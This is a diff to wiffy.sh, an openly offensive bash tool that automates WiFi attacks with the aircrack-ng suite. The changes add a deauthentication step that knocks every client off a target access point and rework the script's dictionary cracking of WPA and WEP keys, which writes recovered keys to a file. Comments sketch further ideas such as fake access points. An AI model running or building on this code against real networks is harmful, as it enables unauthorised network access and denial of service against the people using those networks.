@@ -1,6 +1,6 @@
 #!/bin/bash
 #----------------------------------------------------------------------------------------------#
-#wiffy.sh v0.1 (#27 2010-10-13)                                                                #
+#wiffy.sh v0.1 (#28 2010-10-13)                                                                #
 # (C)opyright 2010 - g0tmi1k                                                                   #
 #---License------------------------------------------------------------------------------------#
 #  This program is free software: you can redistribute it and/or modify it under the terms     #
@@ -54,8 +54,8 @@ benchmark="true"
      displayMore="false"          # Gives more details on whats happening
            debug="false"          # Windows don't close, shows extra stuff
          logFile="wiffy.log"      # Filename of output
-             svn="31"             # SVN Number
-         version="0.1 (#27)"      # Program version
+             svn="32"             # SVN Number
+         version="0.1 (#28)"      # Program version
 trap 'interrupt break' 2          # Captures interrupt signal (Ctrl + C)
 
 #----Functions---------------------------------------------------------------------------------#
@@ -116,6 +116,7 @@ function attack() { #attack mode #$essid $bssid #$mac
             if [[ "$encryption" == *WPA* ]] ; then action "$1" "$command" "true" "0|195|5"
             else action "$1" "$command" "true" "0|285|5" ; fi
          else
+            display action "Attack (DeAuth): *everyone*"
             command="aireplay-ng --deauth 10"
             if [ "$2" ] ; then command="$command -e \"$2\"" ; fi
             command="$command -a $3 $monitorInterface"
@@ -248,31 +249,29 @@ function attackWPA() { #attackWPA
    action "Killing programs" "killall xterm && sleep 1"
    return 0
 }
-function benchmark() { #benchmark $essid
+function benchmark() { #benchmark
    if [ "$debug" == "true" ] ; then display diag "benchmark~$@" ; fi
-   error="free"
-   if [ -z "$1" ] ; then error="1" ; fi # Coding error
-   if [ ! -e "$pathCAP" ] ; then error="2" ; fi
-
-   if [ "$error" == "free" ] ; then
+   if [ -e "/tmp/wiffy.benchmark" ] ; then
       display action "Starting: Benchmarking"
-      wordlistLines=$(wc -l < "$wordlist")
-      if [ "$wordlistLines" -lt "1000" ] ; then display error "Benchmarking: Failed. Not enough words in dictionary" 1>&2
-      else
-         action "Benchmarking" "aircrack-ng $pathCAP -w $wordlist -e \"$1\" > /tmp/wiffy.tmp & sleep 5 && killall xterm" # Hide it, dont show it!
-         ks=$(cat "/tmp/wiffy.tmp" | grep "keys tested" | tail -1 | awk -F " " '{print $5}' | sed 's/.\(.*\)/\1/')
-         rm -f "/tmp/wiffy.tmp"
-
-         mins=$(awk 'BEGIN {print '$wordlistLines' / ( '$ks' * 60 ) }' | awk -F\. '{if(($2/10^length($2)) >= .5) printf("%d\n",$1+1) ; else printf("%d\n",$1)}')
-         hours=$(awk 'BEGIN {print '$wordlistLines' / ( '$ks' * 3600 ) }' | awk -F\. '{if(($2/10^length($2)) >= .5) printf("%d\n",$1+1) ; else printf("%d\n",$1)}')
-         command=$(date --date="$mins min")
-         display info "Benchmark: ETA $command ~ $mins minutes ($hours hours) to try $wordlistLines words"
-      fi
-   else
-      display error "benchmark Error code: $error" 1>&2
-      echo -e "---------------------------------------------------------------------------------------------\nERROR: benchmark (Error code: $error): $1" >> $logFile
-      return 1
+      wordsTotal=$(wc -l < "$wordlist")
+      display info " Start Time=$(date)
+\e[01;33m[i]\e[00m Total Words=$wordsTotal"
    fi
+   while [ $(pgrep aircrack-ng) ] ; do
+      wordsDone=$(cat -A "/tmp/wiffy.benchmark" | grep "keys tested" | tail -1 | sed -n 's/.*] //p' | sed -n 's/ keys tested.*//p' | sed 's/[^0-9.]*//g')
+      keySecond=$(cat -A "/tmp/wiffy.benchmark" | grep "keys tested" | tail -1 | sed -n 's/.*keys tested (//p' | sed -n 's/k\/s).*//p' | sed 's/[^0-9.]*//g' )
+      if [ "$wordsDone" ] && [ "$keySecond" ] ; then
+         wordsRemain=$((wordsTotal-wordsDone))
+         per=$(echo "scale=2; $wordsDone*100/$wordsTotal" | bc)
+         timeMins=$(awk 'BEGIN {print '$wordsRemain' / ( '$keySecond' * 60 ) }' | awk -F\. '{if(($2/10^length($2)) >= .5) printf("%d\n",$1+1) ; else printf("%d\n",$1)}' | sed 's/[^0-9.]*//g' )
+         timeHours=$(awk 'BEGIN {print '$wordsRemain' / ( '$keySecond' * 3600 ) }' | awk -F\. '{if(($2/10^length($2)) >= .5) printf("%d\n",$1+1) ; else printf("%d\n",$1)}' | sed 's/[^0-9.]*//g' )
+         timeETA=$(date --date="$timeMins min")
+         printf "\n\e[01;33m[i]\e[00m ETA: $timeETA ($timeMins minutes/$timeHours hours remain). Words per second: $keySecond. Words done: $wordsDone. Words remain: $wordsRemain. $per%% Complete."
+      fi
+      echo > "/tmp/wiffy.benchmark"
+      sleep 10
+   done
+   echo # Blank line
 }
 function capture() { #capture $bssid $channel
    if [ "$debug" == "true" ] ; then display diag "capture~$@" ; fi
@@ -299,7 +298,6 @@ function cleanUp() { #cleanUp #mode
    if [ "$1" == "nonuser" ] ; then exit 3 ;
    elif [ "$1" != "clean" ] && [ "$1" != "remove" ]; then
       echo # Blank line
-      if [ "$displayMore" == "true" ] ; then display info "*** BREAK ***" ; fi # User quit
       action "Killing xterm" "killall xterm aircrack-ng"
    fi
 
@@ -955,17 +953,25 @@ if [ "$mode" == "crack" ] ; then
    moveCap "$essid"
 
    #----------------------------------------------------------------------------------------------#
+   if [ "$encryption" == "WEP" ] || ( [[ "$encryption" == *WPA* ]] && [ -e "$wordlist" ] ) ; then
+      display action "Starting: aircrack-ng"
+      command="aircrack-ng $pathCAP -e \"$essid\" -l /tmp/wiffy.keys"
+      if [[ "$encryption" == *WPA* ]] ; then command="$command -w $wordlist" ; fi
+      if [ "$benchmark" == "true" ] ; then command="$command | tee /tmp/wiffy.benchmark" ; fi
+
+      if [ "$encryption" == "WEP" ] ; then action "aircrack-ng" "$command" "false" "0|285|30" & sleep 1
+      elif [[ "$encryption" == *WPA* ]] ; then action "aircrack-ng" "$command" "false" "0|0|20" & sleep 1 ; fi
+   fi
+
+   #----------------------------------------------------------------------------------------------#
    if [ "$benchmark" == "true" ] && [[ "$encryption" == *WPA* ]] && [ -e "$wordlist" ] ; then benchmark "$essid" ; fi
 
    #----------------------------------------------------------------------------------------------#
-   if [ "$encryption" == "WEP" ] || ( [[ "$encryption" == *WPA* ]] && [ -e "$wordlist" ] ) ; then
-      display action "Starting: aircrack-ng"
-      if [ "$encryption" == "WEP" ] ; then action "aircrack-ng" "aircrack-ng $pathCAP -e \"$essid\" -l /tmp/wiffy.keys" "false" "0|285|30" ; fi
-      if [[ "$encryption" == *WPA* ]] ; then action "aircrack-ng" "aircrack-ng $pathCAP -e \"$essid\" -l /tmp/wiffy.keys -w $wordlist" "false" "0|0|20" ; fi
-   fi
-   action "Closing programs" "killall xterm ; airmon-ng stop $monitorInterface ; sleep 2" # Sleep = Make sure aircrack-ng has saved file.
+   while [ $(pgrep aircrack-ng) ] ; do
+      sleep 1
+   done
 
-   #----------------------------------------------------------------------------------------------#
+   action "Closing programs" "killall xterm ; airmon-ng stop $monitorInterface ; sleep 2" # Sleep = Make sure aircrack-ng has saved file.
    if [ -e "/tmp/wiffy.keys" ] ; then key=$(cat "/tmp/wiffy.keys") ;  display info "WiFi key: $key" ;  echo -e "---------------------------------------\n      Date: $(date)\n     ESSID: $essid\n     BSSID: $bssid\nEncryption: $encryption\n       Key: $key\n    Client: $client" >> "wiffy.keys" ; if [ "$connect" == "true" ] ; then connect "$essid" "$key" "$bssid" "$client"; fi
    elif [[ "$encryption" == *WPA* ]] && [ -e "$wordlist" ] ; then display error "WPA: WiFi key isn't in the wordlist" 1>&2
    elif [ "$encryption" == "WEP" ] ; then display error "WEP: Couldn't inject" 1>&2
@@ -1032,17 +1038,22 @@ if [ "$diagnostics" == "true" ] ; then echo "-Done!-----------------------------
 cleanUp clean
 
 
-#---Ideas--------------------------------------------------------------------------------------#
+#---Roadmap------------------------------------------------------------------------------------#
+# v0.1 Bug fixes
+# v0.2 "Auto" Mode         - All [W]EP, all W[P]A, [A]ll
+# v0.3 "AP-Less" Attack
+#---Ideas/Notes--------------------------------------------------------------------------------#
 # WPA - brute / hash
 # WPA - use pre hash / use pre capture
 # WPA - use folder for wordlist
-# Crack - Change channel for attacks?
 # Crack - "*may* key" test it with aircrack-ng (once enough)
 # DoS - Doesn't use "Target" anymore
-# Auto - Auto "all" crack (All [W]EP, all W[P]A, [A]ll)
 # All - Check running processors - if not running, cleanUp
-# "AP-Less" ?
 # Remove Dups BBSIDs, ESSID, Encryption & Channel
+# Improve benchmarking
+# Check connect
+#----------------------------------------------------------------------------------------------#
+#Got no data packets from client network & No valid WPA handshakes found & KEY FOUND (only if its g0tmi1k)
 #----------------------------------------------------------------------------------------------#
    #echo $wordlist > $wordlist
    #airolib-ng /tmp/wiffy-$essid.hash --import essid /tmp/wiffy.tmp
@@ -1052,11 +1063,14 @@ cleanUp clean
    #airolib-ng /tmp/wiffy-$essid.hash --clean all
    #airolib-ng /tmp/wiffy-$essid.hash --batch
    #airolib-ng /tmp/wiffy-$essid.hash --verify all
-#----------------------------------------------------------------------------------------------#
+
    #-p [/path/to/file]     ---  Path to pre-captured cap file e.g. $preCap
-#----------------------------------------------------------------------------------------------#
+
    #action "aireplay-ng (Inject)" "airtun-ng -a $bssid $monitorInterface" &
    #action "aireplay-ng (Inject)" "ifconfig at0 192.168.1.83 netmask 255.255.255.0 up" &
    #airdecap-ng -w [wep $key] -p [wpa $key] -k [wpa $key]
-#----------------------------------------------------------------------------------------------#
-#Got no data packets from client network & No valid WPA handshakes found & KEY FOUND (only if its g0tmi1k)
+
+   #attack "deauth"
+   #airebase-ng -N -e "$essid" -a $bssid -W 1 -c $channel $interface
+   #airebase-ng -L -e "$essid" -a $bssid -W 1 -c $channel $interface
+   #airebase-ng -e "$essid" -a $bssid -W 1 -c $channel -z 2 -F /tmp/wiffy $interface
